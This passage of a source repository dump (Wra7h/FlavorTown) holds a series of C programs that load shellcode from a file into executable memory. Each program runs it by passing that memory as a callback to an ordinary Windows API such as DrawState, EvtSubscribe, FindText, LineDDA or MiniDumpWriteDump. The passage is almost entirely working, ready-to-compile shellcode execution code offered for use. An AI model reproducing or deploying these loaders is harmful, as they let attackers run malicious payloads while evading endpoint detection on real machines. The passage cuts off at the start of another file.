	DnsStopMulticastQuery(&sMDNSHandle);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/DrawState.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#include <stdio.h>
#include <windows.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: DrawState.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!hAlloc)
		goto CLEANUP;

	memcpy(hAlloc, Shellcode, SCLen);

	HDC hDC = GetDC(NULL);
	DrawState(hDC, NULL, (DRAWSTATEPROC)hAlloc, NULL, NULL, 0, 0, 1, 1, DSS_MONO); //DSS_MONO to ignore the second param
	ReleaseDC(NULL, hDC);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/EncryptedFileRaw.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file> <another file>

#include <stdio.h>
#include <windows.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	PVOID pContext = NULL;

	if (argc != 3)
	{
		printf("Usage: WriteEncryptedFileRaw.exe C:\\Path\\To\\Shellcode.bin C:\\Path\\to\\a\\file.txt");
		goto CLEANUP;
	}

	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	OpenEncryptedFileRaw(argv[2], CREATE_FOR_IMPORT, &pContext);

	WriteEncryptedFileRaw((PFE_IMPORT_FUNC)hAlloc, NULL, pContext);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (pContext)
		CloseEncryptedFileRaw(pContext);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}

```

`C/EvtSubscribe_CVEEventWrite.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Wevtapi.lib")

#include <stdio.h>
#include <Windows.h>
#include <winevt.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	EVT_HANDLE hEvent = NULL;

	if (argc != 2)
	{
		printf("Usage: EvtSubscribe_CveEventWrite.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	// Setup the event subscription and callback
	hEvent = EvtSubscribe(NULL, NULL, L"Application", L"*[System/EventID=1]", NULL, NULL, (EVT_SUBSCRIBE_CALLBACK)hAlloc, EvtSubscribeToFutureEvents);

	// Generate an event that matches the XPATH query provided to EvtSubscribe
	CveEventWrite(L"2022-123456", L"Wra7h");

	//Wait for the event to be written to the log, which will trigger the callback
	Sleep(10000);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (hEvent)
		EvtClose(hEvent);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}

```

`C/FCICreate.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Cabinet.lib")

#include <stdio.h>
#include <windows.h>
#include <fci.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: FCICreate.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	ERF sERF = { 0 };
	FCICreate( &sERF, NULL, (PFNFCIALLOC)hAlloc,
		NULL, NULL, NULL, NULL,
		NULL, NULL, NULL, NULL, 
		NULL, NULL); 

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/FindText.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Comdlg32.lib")

#include <stdio.h>
#include <windows.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: FindText.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	FINDREPLACE sFindReplace = { 0 };
	sFindReplace.lStructSize = sizeof(FINDREPLACE);
	sFindReplace.hwndOwner = GetForegroundWindow();
	sFindReplace.Flags = FR_ENABLEHOOK;
	sFindReplace.lpstrFindWhat = L"h7arW";
	sFindReplace.lpstrReplaceWith = L"Wra7h";
	sFindReplace.wFindWhatLen = 1;
	sFindReplace.wReplaceWithLen = 1;
	sFindReplace.lpfnHook = (LPFRHOOKPROC)hAlloc;

	FindText(&sFindReplace);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/GetOpenFileName.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Comdlg32.lib")


#include <stdio.h>
#include <windows.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: GetOpenFileName.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	/*
	* To enable a hook procedure for an Explorer-style Open or Save As dialog box, use the OPENFILENAME
	* structure when you create the dialog box. Set the OFN_ENABLEHOOK and OFN_EXPLORER flags in the
	* Flags member and specify the address of an OFNHookProc hook procedure in the lpfnHook member.
	* See: https://docs.microsoft.com/en-us/windows/win32/dlgbox/open-and-save-as-dialog-boxes#explorer-style-hook-procedures
	*/

	OPENFILENAME sOpenFilename = { 0 };
	sOpenFilename.lStructSize = sizeof(OPENFILENAME);
	sOpenFilename.nMaxFile = FILENAME_MAX;
	sOpenFilename.hwndOwner = NULL;
	sOpenFilename.Flags = OFN_ENABLEHOOK | OFN_EXPLORER;
	sOpenFilename.lpfnHook = (LPOFNHOOKPROC) hAlloc;

	GetOpenFileName(&sOpenFilename);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/GetSaveFileName.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Comdlg32.lib")


#include <stdio.h>
#include <windows.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: GetSaveFileName.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	/*
	* To enable a hook procedure for an Explorer-style Open or Save As dialog box, use the OPENFILENAME
	* structure when you create the dialog box. Set the OFN_ENABLEHOOK and OFN_EXPLORER flags in the
	* Flags member and specify the address of an OFNHookProc hook procedure in the lpfnHook member.
	* See: https://docs.microsoft.com/en-us/windows/win32/dlgbox/open-and-save-as-dialog-boxes#explorer-style-hook-procedures
	*/

	OPENFILENAME sOpenFilename = { 0 };
	sOpenFilename.lStructSize = sizeof(OPENFILENAME);
	sOpenFilename.nMaxFile = FILENAME_MAX;
	sOpenFilename.hwndOwner = NULL;
	sOpenFilename.Flags = OFN_ENABLEHOOK | OFN_EXPLORER;
	sOpenFilename.lpfnHook = (LPOFNHOOKPROC) hAlloc;

	GetSaveFileName(&sOpenFilename);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/GrayString.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>

#include <stdio.h>
#include <windows.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: GrayString.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	HDC hDC = GetDC(NULL);
	GrayString(hDC, NULL, hAlloc, hAlloc, 0, 0, 0, 0, 0);
	ReleaseDC(NULL, hDC);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/InternetSetStatusCallback.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Wininet.lib")

#include <stdio.h>
#include <windows.h>
#include <wininet.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	HINTERNET hSession = NULL;
	HINTERNET hInternet = NULL;

	if (argc != 2)
	{
		printf("Usage: InternetSetStatusCallback.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	hSession = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, INTERNET_FLAG_OFFLINE);

	InternetSetStatusCallback(hSession, (INTERNET_STATUS_CALLBACK)hAlloc);
	
	hInternet = InternetConnect(hSession, L"localhost", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
	
CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (hSession)
		InternetCloseHandle(hSession);

	if (hInternet)
		InternetCloseHandle(hInternet);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/LineDDA.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Gdi32.lib")

#include <stdio.h>
#include <windows.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: LineDDA.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	LineDDA(0, 0, 1, 1, (LINEDDAPROC)hAlloc, NULL);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/MFAddPeriodicCallback.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Mfplat.lib")

#include <stdio.h>
#include <Windows.h>
#include <mfapi.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	DWORD dwKey = 0;

	if (argc != 2)
	{
		printf("Usage: MFAddPeriodicCallback.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	MFStartup(MF_VERSION, MFSTARTUP_NOSOCKET);

	MFAddPeriodicCallback((MFPERIODICCALLBACK)hAlloc, NULL, &dwKey);

	Sleep(10000);

	MFShutdown();

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}

```

`C/MI_Session_Close.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Mi.lib")

#include <stdio.h>
#include <windows.h>
#include <mi.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: MI_Session_Close.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);
	
	MI_Application sMIApp = { 0 };
	MI_Session sMISess = { 0 };

	MI_Application_InitializeV1(0, NULL, NULL, &sMIApp);

	MI_Application_NewSession(&sMIApp, NULL, NULL, NULL,
		NULL, NULL, &sMISess);

	MI_Session_Close(&sMISess, NULL, hAlloc); //Worked for small shellcode

	MI_Application_Close(&sMIApp);
	
CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/MI_Session_Invoke.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Mi.lib")

#include <stdio.h>
#include <windows.h>
#include <mi.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: MI_Session_Invoke.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);
	
	MI_Application sMIApp = { 0 };
	MI_Session sMISess = { 0 };
	MI_Operation sMIOp = { 0 };

	MI_OperationCallbacks sMIOpCallbacks = { 0 };
	sMIOpCallbacks.promptUser = NULL;
	sMIOpCallbacks.writeError = NULL;
	sMIOpCallbacks.writeMessage = NULL;
	sMIOpCallbacks.writeProgress = NULL;
	sMIOpCallbacks.instanceResult = hAlloc;
	sMIOpCallbacks.indicationResult = NULL;
	sMIOpCallbacks.classResult = NULL;
	sMIOpCallbacks.streamedParameterResult = NULL;

	MI_Application_InitializeV1(0, NULL, NULL, &sMIApp);

	MI_Application_NewSession(&sMIApp, NULL, NULL, NULL,
		NULL, NULL, &sMISess);

	MI_Session_Invoke(
		&sMISess,
		MI_OPERATIONFLAGS_DEFAULT_RTTI,
		NULL, NULL, NULL,
		NULL, //Specifying NULL here works for triggering large shellcode. Adding a method name still works for small shellcode.
		NULL, NULL,
		&sMIOpCallbacks,
		&sMIOp);

	MI_Operation_Close(&sMIOp);

	MI_Session_Close(&sMISess, NULL, NULL);

	MI_Application_Close(&sMIApp);
	
CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/MagSetWindowTransform.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Magnification.lib")

#include <stdio.h>
#include <windows.h>
#include <magnification.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: MagSetWindowTransform.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);
	
	MagInitialize();

	HWND hWnd = CreateWindowEx(0, WC_MAGNIFIER, L"MagnifierWindow",
		WS_CHILD || MS_SHOWMAGNIFIEDCURSOR || WS_VISIBLE, 0, 0, 100,
		100, NULL, 0, 0, NULL);

	MagSetImageScalingCallback(hWnd, hAlloc);
	
	MAGTRANSFORM sMT = { 0 };
	MagSetWindowTransform(hWnd, &sMT);

	DestroyWindow(hWnd);

	MagUninitialize();
CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/MessageBoxIndirect.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>

#include <stdio.h>
#include <Windows.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: MessageBoxIndirect.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	MSGBOXPARAMS sMsgBox = { 0 };
	sMsgBox.cbSize = sizeof(MSGBOXPARAMS);
	sMsgBox.dwStyle = MB_HELP;
	sMsgBox.lpfnMsgBoxCallback = (MSGBOXCALLBACK)hAlloc;
	sMsgBox.lpszText = L"Click Help for shellcode :D";

	//Click Help button to execute shellcode.
	MessageBoxIndirect(&sMsgBox);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}

```

`C/MiniDumpWriteDump.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Dbghelp.lib")

#include <stdio.h>
#include <Windows.h>
#include <Dbghelp.h> 
#include <processthreadsapi.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: MiniDumpWriteDump.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	MiniDumpWriteDump(GetCurrentProcess(), GetCurrentProcessId(), NULL,
		MiniDumpNormal, NULL, NULL, (PMINIDUMP_CALLBACK_INFORMATION)&hAlloc);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}

```

`C/NPAddConnection3.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
